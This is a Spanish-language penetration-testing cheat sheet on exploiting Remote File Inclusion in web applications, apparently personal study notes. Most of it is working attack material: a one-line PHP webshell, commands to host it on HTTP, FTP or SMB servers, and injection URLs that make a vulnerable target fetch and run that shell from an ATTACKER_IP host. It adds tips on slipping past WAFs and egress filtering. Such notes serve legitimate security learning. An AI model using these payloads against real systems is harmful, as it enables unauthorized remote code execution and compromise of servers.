---
tags:
  - RCE
  - RFI
  - LFI
  - webapp
---
## Conceptos Clave (TL;DR)

* La Inclusión Remota de Archivos (RFI) permite a un atacante incluir URLs remotas en funciones vulnerables de una aplicación web. Su explotación exitosa permite dos beneficios principales: ejecución de código remoto (RCE) al alojar scripts maliciosos, y enumeración de puertos/aplicaciones internas mediante Server-Side Request Forgery (SSRF).

* RFI requiere condiciones específicas que no siempre están presentes en vulnerabilidades de LFI, como control total del "protocol wrapper" (ej. http://) y configuraciones del servidor que permitan inclusiones remotas (que suelen estar deshabilitadas por defecto).

* En entornos PHP, la inclusión de URLs remotas generalmente requiere que la directiva de configuración allow_url_include esté habilitada.


## Herramientas Clave

* **Python http.server:** Para levantar un servidor web rápido que sirva payloads maliciosos vía HTTP.

* **Python pyftpdlib:** Para levantar un servidor FTP básico, útil cuando los puertos HTTP están bloqueados por firewalls o Web Application Firewalls (WAF).

* **Impacket smbserver.py:** Para levantar un recurso compartido SMB, ideal para explotar RFI en servidores Windows sin depender de configuraciones PHP específicas.

  

## Metodología Paso a Paso

1. **Verificación Inicial Segura:** Antes de intentar RFI desde internet, inyecta una URL local (ej. localhost) para confirmar la vulnerabilidad sin ser bloqueado por firewalls perimetrales.

2. **Evaluación de Capacidades:** Observa si la aplicación renderiza y ejecuta el archivo como código (permite RCE) o si solo lee el texto plano (limita el vector a SSRF).

3. **Creación del Payload:** Desarrolla una webshell o script malicioso en el lenguaje nativo del servidor objetivo (ej. PHP).

4. **Despliegue de Infraestructura:** Aloja tu payload en un servidor propio utilizando puertos comunes (80, 443, 21) para evadir reglas de filtrado de salida (egress filtering) del servidor comprometido.

5. **Ejecución y Escalada:** Pasa la URL remota de tu payload al parámetro vulnerable y concatena los comandos del sistema que deseas ejecutar.


## Cheat Sheet de Comandos

### Verificación de Configuración PHP vía LFI previo
```bash
# Decodifica un archivo de configuracion de PHP (previamente obtenido en base64) y busca si la directiva necesaria para RFI esta activa

echo '<BASE64_PHP_CONFIG_FILE>' | base64 -d | grep allow_url_include
```

### Verificación de RFI (Bypass Firewall)
```http
# Inyecta una URL local apuntando al puerto 80 del mismo servidor para verificar si incluye URLs sin activar bloqueos externos

http://<TARGET_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

### Creación de Webshell Básica (PHP)
```bash
# Crea un archivo PHP que recibe un comando del sistema via parametro GET "cmd" y lo ejecuta

echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Explotación vía HTTP
```bash
# Levanta un servidor web en el directorio actual escuchando en el puerto especificado

sudo python3 -m http.server <LISTENING_PORT>
```

```http
# Ejecuta la webshell remota inyectando tu IP y ejecutando el comando "id"

http://<TARGET_IP>:<PORT>/index.php?language=http://<ATTACKER_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

### Explotación vía FTP
```bash
# Inicia un servidor FTP anonimo en el puerto 21 usando la libreria de Python

sudo python -m pyftpdlib -p 21
```

```http
# Inyecta el payload a traves del esquema ftp:// (util para evadir WAFs que bloquean "http://")

http://<TARGET_IP>:<PORT>/index.php?language=ftp://<ATTACKER_IP>/shell.php&cmd=id
```

```bash
# Ejecuta el RFI via FTP utilizando credenciales especificas si el servidor FTP requiere autenticacion

curl 'http://<TARGET_IP>:<PORT>/index.php?language=ftp://<USER>:<PASSWORD>@<ATTACKER_IP>/shell.php&cmd=id'
```

### Explotación vía SMB (Solo Windows)
```bash
# Levanta un servidor SMB con soporte para SMBv2 y comparte el directorio actual (.) bajo el nombre "share"

impacket-smbserver -smb2support share $(pwd)
```

```http
# Inyecta el payload remoto usando una ruta UNC de Windows. No requiere configuraciones especiales de PHP

http://<TARGET_IP>:<PORT>/index.php?language=\\<ATTACKER_IP>\share\shell.php&cmd=whoami
```

  
## "Gotchas" y Troubleshooting

* **DoS Accidental (Loop Recursivo):** Nunca intentes incluir remotamente la misma página vulnerable (ej. incluir index.php dentro de index.php), ya que puede causar un bucle de inclusión infinito y derivar en Denegación de Servicio (DoS) del backend.

* **Extensiones Forzadas:** Si observas en los logs de tu servidor HTTP que la aplicación objetivo anexa automáticamente una extensión (como ".php") al final de tu solicitud, omite dicha extensión en el nombre de tu payload al inyectar la URL.

* **RFI como SSRF:** Funciones como `file_get_contents()` en PHP o `@Html.RemotePartial()` en .NET permitirán leer el contenido de una URL remota, pero no ejecutarán el código fuente. En estos casos, pivota tu enfoque exclusivamente a SSRF para enumerar la red interna o puertos locales cerrados externamente.

* **Bloqueos SMB (Windows):** Aunque el vector SMB en Windows omite la necesidad de `allow_url_include`, es muy probable que falle al atacar a través de internet porque los puertos SMB de salida suelen estar bloqueados en configuraciones corporativas. Esta técnica es altamente efectiva si te encuentras pivotando dentro de la misma red interna.